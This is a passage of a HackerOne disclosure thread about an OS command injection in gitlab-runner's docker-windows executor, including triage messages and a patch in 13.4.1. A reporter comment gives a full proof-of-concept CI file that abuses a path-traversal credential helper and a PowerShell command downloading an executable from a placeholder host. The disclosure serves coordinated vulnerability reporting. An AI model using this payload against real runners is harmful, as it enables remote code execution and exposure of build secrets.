src=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/WwTP9bAu5UPfzCRXdpps5Tm9?response-content-disposition=attachment%3B%20filename%3D%22gitlab-runner-windows.mp4%22%3B%20filename%2A%3DUTF-8%27%27gitlab-runner-windows.mp4\u0026amp;response-content-type=video%2Fmp4\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQYENXQUKC%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T071430Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIHXwr%2Bz%2B7j54GXjIZDeFjE7V4KhtcLVpveDKyRp%2FgHMpAiEA%2FzBLaI4tlPUnNvgzY0X8n68OkDDLSfCBmjTZSd2A%2BM8qtAMIVRABGgwwMTM2MTkyNzQ4NDkiDOLyu53NKIhzdiDnLyqRA1YiznmwUquOZL6cfEwHlrCEbfV1uip5mxrCKpzmpc9DKyYejzEqNMg8%2Fo1XQZiQbQ9Mn8QGMjtqUBvpzsRmfLsdw4KO6Yix26%2Foq9H6jcEfUIX3EyFaY0ofGk42HT5lnakJ%2FUAtv5lyqirA3laDcoq6u60WpxBZh0jLi92Ajs9kGkzDbgWJPXMK2%2FlVglZWa%2BjQNhDftrEqJh4ZV%2FIwfbcJ6s89eju9B4Xkun1IUiVjrUtA5LTMlkDAEwqtGdl3pucepUSB2hZBvbqUfgiT65T%2BpLDNg0LFqEXPPPqqyrYG3%2BqTXIZxR1FfbdXOQjx1UoPwboCHOwSOpOKGaPs6TEM2o6Sg2U%2BGvuy3dMdtNBCfH4SIfBdeUa84eWUftCR4OwBiC0F1Cl6iPIZXa92zkJSAVTz9swPvr%2BghYLYGIjX%2F8jqVGlADsLB1sl%2BqlNRFkwYrvTDOWwnYmDuvQmmhpAQ6Mg%2Fp05v07WKHRsbG%2BAUzVJ3M02i0HIdWCGKjqKXgGZi%2FLBrHUEV9bzaVWmpeFEE3MObUqv8FOusBMEus3670kEKa62xVKQkID%2Fav5Xylzf384wPv9i4fBKmwghqKR67wSDPkErUtnTlN6wJNos0uBd5jibop6zjPh%2BDMaeI%2Bt4z0CbNpMS83WKn2xS%2FvSK0QFyg217PkDWCKklNPmbumtDteHdU2qRRX%2BQwVoTBmoRFgs97OyKXEz2rc7ZIcHuDnAibsNVPNZEuX9m%2B04KKBBkwdIr0sY3zEiVHvTVxPYBSsKfBPuZwzi6W3T3aq%2BF9l860FnFBaV964%2BlbASqZkuTd4cEZ8C2GJad6RyY164GfHgpKnmQ6aYbLhiDTz0xF3adlmhg%3D%3D\u0026amp;X-Amz-Signature=dcc3006a3866b9cd14ec5301ef258bb7f9abb19406dbd2494681117bf19e5950\" class=\"markdown-inline-image\" style=\"display: inline-block\"\u003e\u003c/video\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003ch2 id=\"output-of-checks\"\u003eOutput of checks\u003c/h2\u003e\n\n\u003cp\u003e\u003ccode\u003egitlab-runner --version\u003c/code\u003e\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eVersion:      13.2.2\nGit revision: a998cacd\nGit branch:   refs/pipelines/172580057\nGO version:   go1.13.8\nBuilt:        2020-07-30T14:52:23+0000\nOS/Arch:      windows/amd64\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003e\u003ccode\u003econfig.toml\u003c/code\u003e\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight toml\"\u003e\u003ccode\u003e\u003cspan class=\"py\"\u003econcurrent\u003c/span\u003e \u003cspan class=\"p\"\u003e=\u003c/span\u003e \u003cspan class=\"mi\"\u003e1\u003c/span\u003e\n\u003cspan class=\"py\"\u003echeck_interval\u003c/span\u003e \u003cspan class=\"p\"\u003e=\u003c/span\u003e \u003cspan class=\"mi\"\u003e0\u003c/span\u003e\n\n\u003cspan class=\"nn\"\u003e[session_server]\u003c/span\u003e\n  \u003cspan class=\"py\"\u003esession_timeout\u003c/span\u003e \u003cspan class=\"p\"\u003e=\u003c/span\u003e \u003cspan class=\"mi\"\u003e1800\u003c/span\u003e\n\n\u003cspan class=\"nn\"\u003e[[runners]]\u003c/span\u003e\n  \u003cspan class=\"py\"\u003ename\u003c/span\u003e \u003cspan class=\"p\"\u003e=\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026quot;windows\u0026quot;\u003c/span\u003e\n  \u003cspan class=\"py\"\u003eurl\u003c/span\u003e \u003cspan class=\"p\"\u003e=\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026quot;https://gitlab.com\u0026quot;\u003c/span\u003e\n  \u003cspan class=\"py\"\u003etoken\u003c/span\u003e \u003cspan class=\"p\"\u003e=\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026quot;█████\u0026quot;\u003c/span\u003e\n  \u003cspan class=\"py\"\u003eexecutor\u003c/span\u003e \u003cspan class=\"p\"\u003e=\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026quot;docker-windows\u0026quot;\u003c/span\u003e\n  \u003cspan class=\"nn\"\u003e[runners.custom_build_dir]\u003c/span\u003e\n  \u003cspan class=\"nn\"\u003e[runners.cache]\u003c/span\u003e\n    \u003cspan class=\"nn\"\u003e[runners.cache.s3]\u003c/span\u003e\n    \u003cspan class=\"nn\"\u003e[runners.cache.gcs]\u003c/span\u003e\n  \u003cspan class=\"nn\"\u003e[runners.docker]\u003c/span\u003e\n    \u003cspan class=\"py\"\u003etls_verify\u003c/span\u003e \u003cspan class=\"p\"\u003e=\u003c/span\u003e \u003cspan class=\"kc\"\u003efalse\u003c/span\u003e\n    \u003cspan class=\"py\"\u003eimage\u003c/span\u003e \u003cspan class=\"p\"\u003e=\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026quot;mcr.microsoft.com/windows/servercore:1809\u0026quot;\u003c/span\u003e\n    \u003cspan class=\"py\"\u003eprivileged\u003c/span\u003e \u003cspan class=\"p\"\u003e=\u003c/span\u003e \u003cspan class=\"kc\"\u003efalse\u003c/span\u003e\n    \u003cspan class=\"py\"\u003edisable_entrypoint_overwrite\u003c/span\u003e \u003cspan class=\"p\"\u003e=\u003c/span\u003e \u003cspan class=\"kc\"\u003efalse\u003c/span\u003e\n    \u003cspan class=\"py\"\u003eoom_kill_disable\u003c/span\u003e \u003cspan class=\"p\"\u003e=\u003c/span\u003e \u003cspan class=\"kc\"\u003efalse\u003c/span\u003e\n    \u003cspan class=\"py\"\u003edisable_cache\u003c/span\u003e \u003cspan class=\"p\"\u003e=\u003c/span\u003e \u003cspan class=\"kc\"\u003efalse\u003c/span\u003e\n    \u003cspan class=\"py\"\u003evolumes\u003c/span\u003e \u003cspan class=\"p\"\u003e=\u003c/span\u003e \u003cspan class=\"nn\"\u003e[\u0026quot;c:\\\\cache\u0026quot;]\u003c/span\u003e\n    \u003cspan class=\"py\"\u003eshm_size\u003c/span\u003e \u003cspan class=\"p\"\u003e=\u003c/span\u003e \u003cspan class=\"mi\"\u003e0\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003ch2 id=\"impact\"\u003eImpact\u003c/h2\u003e\n\n\u003cp\u003eExploitation of this issue could compromise the underlying system on which \u003ccode\u003egitlab-runner\u003c/code\u003e runs, exposing source code, build artifacts and other sensitive data to a malicious user.\u003c/p\u003e\n","bounty_amount":"6500.0","formatted_bounty":"$6,500","weakness":{"id":59,"name":"OS Command Injection"},"original_report_id":null,"original_report_url":null,"attachments":[{"id":943021,"file_name":"gitlab-runner-windows.mp4","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/WwTP9bAu5UPfzCRXdpps5Tm9?response-content-disposition=attachment%3B%20filename%3D%22gitlab-runner-windows.mp4%22%3B%20filename%2A%3DUTF-8%27%27gitlab-runner-windows.mp4\u0026response-content-type=video%2Fmp4\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQYENXQUKC%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T071430Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIHXwr%2Bz%2B7j54GXjIZDeFjE7V4KhtcLVpveDKyRp%2FgHMpAiEA%2FzBLaI4tlPUnNvgzY0X8n68OkDDLSfCBmjTZSd2A%2BM8qtAMIVRABGgwwMTM2MTkyNzQ4NDkiDOLyu53NKIhzdiDnLyqRA1YiznmwUquOZL6cfEwHlrCEbfV1uip5mxrCKpzmpc9DKyYejzEqNMg8%2Fo1XQZiQbQ9Mn8QGMjtqUBvpzsRmfLsdw4KO6Yix26%2Foq9H6jcEfUIX3EyFaY0ofGk42HT5lnakJ%2FUAtv5lyqirA3laDcoq6u60WpxBZh0jLi92Ajs9kGkzDbgWJPXMK2%2FlVglZWa%2BjQNhDftrEqJh4ZV%2FIwfbcJ6s89eju9B4Xkun1IUiVjrUtA5LTMlkDAEwqtGdl3pucepUSB2hZBvbqUfgiT65T%2BpLDNg0LFqEXPPPqqyrYG3%2BqTXIZxR1FfbdXOQjx1UoPwboCHOwSOpOKGaPs6TEM2o6Sg2U%2BGvuy3dMdtNBCfH4SIfBdeUa84eWUftCR4OwBiC0F1Cl6iPIZXa92zkJSAVTz9swPvr%2BghYLYGIjX%2F8jqVGlADsLB1sl%2BqlNRFkwYrvTDOWwnYmDuvQmmhpAQ6Mg%2Fp05v07WKHRsbG%2BAUzVJ3M02i0HIdWCGKjqKXgGZi%2FLBrHUEV9bzaVWmpeFEE3MObUqv8FOusBMEus3670kEKa62xVKQkID%2Fav5Xylzf384wPv9i4fBKmwghqKR67wSDPkErUtnTlN6wJNos0uBd5jibop6zjPh%2BDMaeI%2Bt4z0CbNpMS83WKn2xS%2FvSK0QFyg217PkDWCKklNPmbumtDteHdU2qRRX%2BQwVoTBmoRFgs97OyKXEz2rc7ZIcHuDnAibsNVPNZEuX9m%2B04KKBBkwdIr0sY3zEiVHvTVxPYBSsKfBPuZwzi6W3T3aq%2BF9l860FnFBaV964%2BlbASqZkuTd4cEZ8C2GJad6RyY164GfHgpKnmQ6aYbLhiDTz0xF3adlmhg%3D%3D\u0026X-Amz-Signature=dcc3006a3866b9cd14ec5301ef258bb7f9abb19406dbd2494681117bf19e5950","file_size":3134616,"type":"video/mp4"}],"allow_singular_disclosure_at":null,"vote_count":71,"voters":["sky003","ajxchapman","mzfr","cdl","bull","bl4de","mik317","rahsec","mygf","tosun","and 61 more..."],"severity":{"rating":"high","author_type":"Team"},"structured_scope":{"databaseId":39022,"asset_type":"OTHER","asset_identifier":"Your Own GitLab Instance","max_severity":"critical"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":8895362,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Full payload to download and execute an arbitrary program from a webserver (`gitlab-runner` on Windows 2019 with `docker-windows` runner):\n```yml\nvariables:\n  DOCKER_AUTH_CONFIG: \"{\\\"credHelpers\\\" : {\\\"repo.example.com\\\" : \\\"/../../../../../../../../ProgramData/docker/volumes/runner-aapjznsw-project-20444930-concurrent-0-cache-cde2929a41401004cf47d36bdb2eb380/_data/poc.exe\\\"}}\"\n\nservices:\n  - name: mcr.microsoft.com/windows/servercore:1809\n    entrypoint: [\"powershell\"]\n    command: [\"Invoke-WebRequest -Uri http://example.com/poc.exe -OutFile c:/builds/poc.exe; sleep 100\"]\n\nimage: sdfgdsfgsdfgdsfgdsfg:124\n\nbuild1:\n  tags:\n    - windows-docker-runner\n  stage: build\n  script:\n    - sleep 200\n```\n\n* `aapjznsw` in `runner-aapjznsw-project-20444930-concurrent` should be replaced with the runner name, available from the CI/CD settings or build logs.\n* `20444930` in `runner-aapjznsw-project-20444930-concurrent` should be replaced with the project ID\n* `http://example.com/poc.exe` should be replaced with a URL from which to download a PoC executable.","markdown_message":"\u003cp\u003eFull payload to download and execute an arbitrary program from a webserver (\u003ccode\u003egitlab-runner\u003c/code\u003e on Windows 2019 with \u003ccode\u003edocker-windows\u003c/code\u003e runner):\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight yaml\"\u003e\u003ccode\u003e\u003cspan class=\"na\"\u003evariables\u003c/span\u003e\u003cspan class=\"pi\"\u003e:\u003c/span\u003e\n  \u003cspan class=\"na\"\u003eDOCKER_AUTH_CONFIG\u003c/span\u003e\u003cspan class=\"pi\"\u003e:\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s\"\u003e{\u003c/span\u003e\u003cspan class=\"se\"\u003e\\\u0026quot;\u003c/span\u003e\u003cspan class=\"s\"\u003ecredHelpers\u003c/span\u003e\u003cspan class=\"se\"\u003e\\\u0026quot;\u003c/span\u003e\u003cspan class=\"nv\"\u003e \u003c/span\u003e\u003cspan class=\"s\"\u003e:\u003c/span\u003e\u003cspan class=\"nv\"\u003e \u003c/span\u003e\u003cspan class=\"s\"\u003e{\u003c/span\u003e\u003cspan class=\"se\"\u003e\\\u0026quot;\u003c/span\u003e\u003cspan class=\"s\"\u003erepo.example.com\u003c/span\u003e\u003cspan class=\"se\"\u003e\\\u0026quot;\u003c/span\u003e\u003cspan class=\"nv\"\u003e \u003c/span\u003e\u003cspan class=\"s\"\u003e:\u003c/span\u003e\u003cspan class=\"nv\"\u003e \u003c/span\u003e\u003cspan class=\"se\"\u003e\\\u0026quot;\u003c/span\u003e\u003cspan class=\"s\"\u003e/../../../../../../../../ProgramData/docker/volumes/runner-aapjznsw-project-20444930-concurrent-0-cache-cde2929a41401004cf47d36bdb2eb380/_data/poc.exe\u003c/span\u003e\u003cspan class=\"se\"\u003e\\\u0026quot;\u003c/span\u003e\u003cspan class=\"s\"\u003e}}\u0026quot;\u003c/span\u003e\n\n\u003cspan class=\"na\"\u003eservices\u003c/span\u003e\u003cspan class=\"pi\"\u003e:\u003c/span\u003e\n  \u003cspan class=\"pi\"\u003e-\u003c/span\u003e \u003cspan class=\"na\"\u003ename\u003c/span\u003e\u003cspan class=\"pi\"\u003e:\u003c/span\u003e \u003cspan class=\"s\"\u003emcr.microsoft.com/windows/servercore:1809\u003c/span\u003e\n    \u003cspan class=\"na\"\u003eentrypoint\u003c/span\u003e\u003cspan class=\"pi\"\u003e:\u003c/span\u003e \u003cspan class=\"pi\"\u003e[\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s\"\u003epowershell\u0026quot;\u003c/span\u003e\u003cspan class=\"pi\"\u003e]\u003c/span\u003e\n    \u003cspan class=\"na\"\u003ecommand\u003c/span\u003e\u003cspan class=\"pi\"\u003e:\u003c/span\u003e \u003cspan class=\"pi\"\u003e[\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s\"\u003eInvoke-WebRequest\u003c/span\u003e\u003cspan class=\"nv\"\u003e \u003c/span\u003e\u003cspan class=\"s\"\u003e-Uri\u003c/span\u003e\u003cspan class=\"nv\"\u003e \u003c/span\u003e\u003cspan class=\"s\"\u003ehttp://example.com/poc.exe\u003c/span\u003e\u003cspan class=\"nv\"\u003e \u003c/span\u003e\u003cspan class=\"s\"\u003e-OutFile\u003c/span\u003e\u003cspan class=\"nv\"\u003e \u003c/span\u003e\u003cspan class=\"s\"\u003ec:/builds/poc.exe;\u003c/span\u003e\u003cspan class=\"nv\"\u003e \u003c/span\u003e\u003cspan class=\"s\"\u003esleep\u003c/span\u003e\u003cspan class=\"nv\"\u003e \u003c/span\u003e\u003cspan class=\"s\"\u003e100\u0026quot;\u003c/span\u003e\u003cspan class=\"pi\"\u003e]\u003c/span\u003e\n\n\u003cspan class=\"na\"\u003eimage\u003c/span\u003e\u003cspan class=\"pi\"\u003e:\u003c/span\u003e \u003cspan class=\"s\"\u003esdfgdsfgsdfgdsfgdsfg:124\u003c/span\u003e\n\n\u003cspan class=\"na\"\u003ebuild1\u003c/span\u003e\u003cspan class=\"pi\"\u003e:\u003c/span\u003e\n  \u003cspan class=\"na\"\u003etags\u003c/span\u003e\u003cspan class=\"pi\"\u003e:\u003c/span\u003e\n    \u003cspan class=\"pi\"\u003e-\u003c/span\u003e \u003cspan class=\"s\"\u003ewindows-docker-runner\u003c/span\u003e\n  \u003cspan class=\"na\"\u003estage\u003c/span\u003e\u003cspan class=\"pi\"\u003e:\u003c/span\u003e \u003cspan class=\"s\"\u003ebuild\u003c/span\u003e\n  \u003cspan class=\"na\"\u003escript\u003c/span\u003e\u003cspan class=\"pi\"\u003e:\u003c/span\u003e\n    \u003cspan class=\"pi\"\u003e-\u003c/span\u003e \u003cspan class=\"s\"\u003esleep \u003c/span\u003e\u003cspan class=\"m\"\u003e200\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003ccode\u003eaapjznsw\u003c/code\u003e in \u003ccode\u003erunner-aapjznsw-project-20444930-concurrent\u003c/code\u003e should be replaced with the runner name, available from the CI/CD settings or build logs.\u003c/li\u003e\n\u003cli\u003e\n\u003ccode\u003e20444930\u003c/code\u003e in \u003ccode\u003erunner-aapjznsw-project-20444930-concurrent\u003c/code\u003e should be replaced with the project ID\u003c/li\u003e\n\u003cli\u003e\n\u003ccode\u003ehttp://example.com/poc.exe\u003c/code\u003e should be replaced with a URL from which to download a PoC executable.\u003c/li\u003e\n\u003c/ul\u003e\n","automated_response":false,"created_at":"2020-08-10T15:19:03.881Z","updated_at":"2020-08-10T15:19:03.881Z","actor":{"username":"ajxchapman","cleared":true,"url":"/ajxchapman","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/141/831/67daf6985b76c1867ff3f442fe5910bb329ee0b4_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8895367,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @ajxchapman,\n\nThank you for submitting this report! We will investigate the issue as soon as\npossible, and should get back within a week.\n\nPlease do not submit your report or ask about its status through additional\nchannels, as this unnecessarily binds resources in the security team.\n\nBest regards,\nGitLab Security Team\n","markdown_message":"\u003cp\u003eHi \u003ca href=\"/ajxchapman\"\u003e@ajxchapman\u003c/a\u003e,\u003c/p\u003e\n\n\u003cp\u003eThank you for submitting this report! We will investigate the issue as soon as\u003cbr\u003e\npossible, and should get back within a week.\u003c/p\u003e\n\n\u003cp\u003ePlease do not submit your report or ask about its status through additional\u003cbr\u003e\nchannels, as this unnecessarily binds resources in the security team.\u003c/p\u003e\n\n\u003cp\u003eBest regards,\u003cbr\u003e\nGitLab Security Team\u003c/p\u003e\n","automated_response":true,"created_at":"2020-08-10T15:20:01.303Z","updated_at":"2020-08-10T15:20:01.303Z","actor":{"username":"gitlab-securitybot","cleared":false,"url":"/gitlab-securitybot","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":8913150,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@ajxchapman,\nThank you for submitting this report. This issue is now escalated to the engineering team for verification and analysis and is tracked here https://gitlab.com/gitlab-org/gitlab-runner/-/issues/26725. We will get back to you once a feedback is received from the team.\n\nBest Regards,\nGitLab Security Team ","markdown_message":"\u003cp\u003e\u003ca href=\"/ajxchapman\"\u003e@ajxchapman\u003c/a\u003e,\u003cbr\u003e\nThank you for submitting this report. This issue is now escalated to the engineering team for verification and analysis and is tracked here \u003ca title=\"https://gitlab.com/gitlab-org/gitlab-runner/-/issues/26725\" href=\"/redirect?url=https%3A%2F%2Fgitlab.com%2Fgitlab-org%2Fgitlab-runner%2F-%2Fissues%2F26725\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://gitlab.com/gitlab-org/gitlab-runner/-/issues/26725\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e. We will get back to you once a feedback is received from the team.\u003c/p\u003e\n\n\u003cp\u003eBest Regards,\u003cbr\u003e\nGitLab Security Team \u003c/p\u003e\n","automated_response":false,"created_at":"2020-08-12T07:54:44.153Z","updated_at":"2020-08-12T07:54:44.153Z","actor":{"username":"ngeorge","cleared":false,"url":"/ngeorge","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":8990569,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @ngeorge, I've just noticed this bug has not been triaged yet. If you require any further details to help with triage please feel free to reach out.\n\nThanks,\nAlex","markdown_message":"\u003cp\u003eHi \u003ca href=\"/ngeorge\"\u003e@ngeorge\u003c/a\u003e, I\u0026#39;ve just noticed this bug has not been triaged yet. If you require any further details to help with triage please feel free to reach out.\u003c/p\u003e\n\n\u003cp\u003eThanks,\u003cbr\u003e\nAlex\u003c/p\u003e\n","automated_response":false,"created_at":"2020-08-20T15:36:13.410Z","updated_at":"2020-08-20T15:36:13.410Z","actor":{"username":"ajxchapman","cleared":true,"url":"/ajxchapman","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/141/831/67daf6985b76c1867ff3f442fe5910bb329ee0b4_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8996573,"is_internal":false,"editable":false,"type":"Activities::ReportSeverityUpdated","message":"","markdown_message":"","automated_response":false,"created_at":"2020-08-21T06:33:24.878Z","updated_at":"2020-08-21T06:33:24.878Z","additional_data":{"old_severity":"High (8.0)","new_severity":"Low","old_severity_id":814109,"new_severity_id":824756},"actor":{"username":"ngeorge","cleared":false,"url":"/ngeorge","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":8996577,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Hello @ajxchapman,\n\nThank you for submitting this report.\n\nWe have verified this finding and have escalated to our engineering team.  We will be tracking progress internally at https://gitlab.com/gitlab-org/gitlab-runner/-/issues/26725. This issue will be made public 30 days following the release of a patch.\n\nPlease note that we have decided to change severity to Low considering that the windows executors are not common.\nWe will review this decision when deciding about the bounty amount. We will continue to update you via HackerOne as a patch is scheduled for release.\n\nBest regards,\nGitLab Security Team","markdown_message":"\u003cp\u003eHello \u003ca href=\"/ajxchapman\"\u003e@ajxchapman\u003c/a\u003e,\u003c/p\u003e\n\n\u003cp\u003eThank you for submitting this report.\u003c/p\u003e\n\n\u003cp\u003eWe have verified this finding and have escalated to our engineering team.  We will be tracking progress internally at \u003ca title=\"https://gitlab.com/gitlab-org/gitlab-runner/-/issues/26725\" href=\"/redirect?url=https%3A%2F%2Fgitlab.com%2Fgitlab-org%2Fgitlab-runner%2F-%2Fissues%2F26725\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://gitlab.com/gitlab-org/gitlab-runner/-/issues/26725\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e. This issue will be made public 30 days following the release of a patch.\u003c/p\u003e\n\n\u003cp\u003ePlease note that we have decided to change severity to Low considering that the windows executors are not common.\u003cbr\u003e\nWe will review this decision when deciding about the bounty amount. We will continue to update you via HackerOne as a patch is scheduled for release.\u003c/p\u003e\n\n\u003cp\u003eBest regards,\u003cbr\u003e\nGitLab Security Team\u003c/p\u003e\n","automated_response":false,"created_at":"2020-08-21T06:33:57.472Z","updated_at":"2020-08-21T06:33:57.472Z","actor":{"username":"ngeorge","cleared":false,"url":"/ngeorge","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":9007138,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"ETA for fix:\n\nHi @ajxchapman,\n\nThe issue you reported is currently scheduled to be fixed by 2020-09-30.\n\nThank you again for contacting us!\n\nBest regards,\nGitLab Security Team\n","markdown_message":"\u003cp\u003eETA for fix:\u003c/p\u003e\n\n\u003cp\u003eHi \u003ca href=\"/ajxchapman\"\u003e@ajxchapman\u003c/a\u003e,\u003c/p\u003e\n\n\u003cp\u003eThe issue you reported is currently scheduled to be fixed by 2020-09-30.\u003c/p\u003e\n\n\u003cp\u003eThank you again for contacting us!\u003c/p\u003e\n\n\u003cp\u003eBest regards,\u003cbr\u003e\nGitLab Security Team\u003c/p\u003e\n","automated_response":true,"created_at":"2020-08-22T04:19:53.975Z","updated_at":"2020-08-22T04:19:53.975Z","actor":{"username":"gitlab-securitybot","cleared":false,"url":"/gitlab-securitybot","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":9419657,"is_internal":false,"editable":false,"type":"Activities::ReportSeverityUpdated","message":"","markdown_message":"","automated_response":false,"created_at":"2020-10-05T11:51:08.228Z","updated_at":"2020-10-05T11:51:08.228Z","additional_data":{"old_severity":"Low","new_severity":"High","old_severity_id":824756,"new_severity_id":865111},"actor":{"username":"ngeorge","cleared":false,"url":"/ngeorge","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":9419706,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Hello @ajxchapman,\n\nThank you again for the report! Your finding has been patched in GitLab runner version 13.4.1. Congratulations!\nAs mentioned earlier, after further internal discussion the severity has been revised to `High`. \n\nPlease let us know if you find that our patch does not mitigate your finding. Your report will be published in 30 days in GitLab's issue tracker.\n\nWe look forward to your next report!\n\nBest regards,\nGitLab Security Team","markdown_message":"\u003cp\u003eHello \u003ca href=\"/ajxchapman\"\u003e@ajxchapman\u003c/a\u003e,\u003c/p\u003e\n\n\u003cp\u003eThank you again for the report! Your finding has been patched in GitLab runner version 13.4.1. Congratulations!\u003cbr\u003e\nAs mentioned earlier, after further internal discussion the severity has been revised to \u003ccode\u003eHigh\u003c/code\u003e. \u003c/p\u003e\n\n\u003cp\u003ePlease let us know if you find that our patch does not mitigate your finding. Your report will be published in 30 days in GitLab\u0026#39;s issue tracker.\u003c/p\u003e\n\n\u003cp\u003eWe look forward to your next report!\u003c/p\u003e\n\n\u003cp\u003eBest regards,\u003cbr\u003e\nGitLab Security Team\u003c/p\u003e\n","automated_response":false,"created_at":"2020-10-05T11:56:42.065Z","updated_at":"2020-10-05T11:56:42.065Z","actor":{"username":"ngeorge","cleared":false,"url":"/ngeorge","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"reporter":{"username":"ajxchapman","url":"/ajxchapman"},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":9425856,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @ngeorge, thanks for the update. Would you be able to confirm when this issue will be awarded? As I understand it, the GitLab policy is to award bounties on resolution or 45 days from triage. As it happens both of those conditions were met today.\n\nThanks,\nAlex","markdown_message":"\u003cp\u003eHi \u003ca href=\"/ngeorge\"\u003e@ngeorge\u003c/a\u003e, thanks for the update. Would you be able to confirm when this issue will be awarded? As I understand it, the GitLab policy is to award bounties on resolution or 45 days from triage. As it happens both of those conditions were met 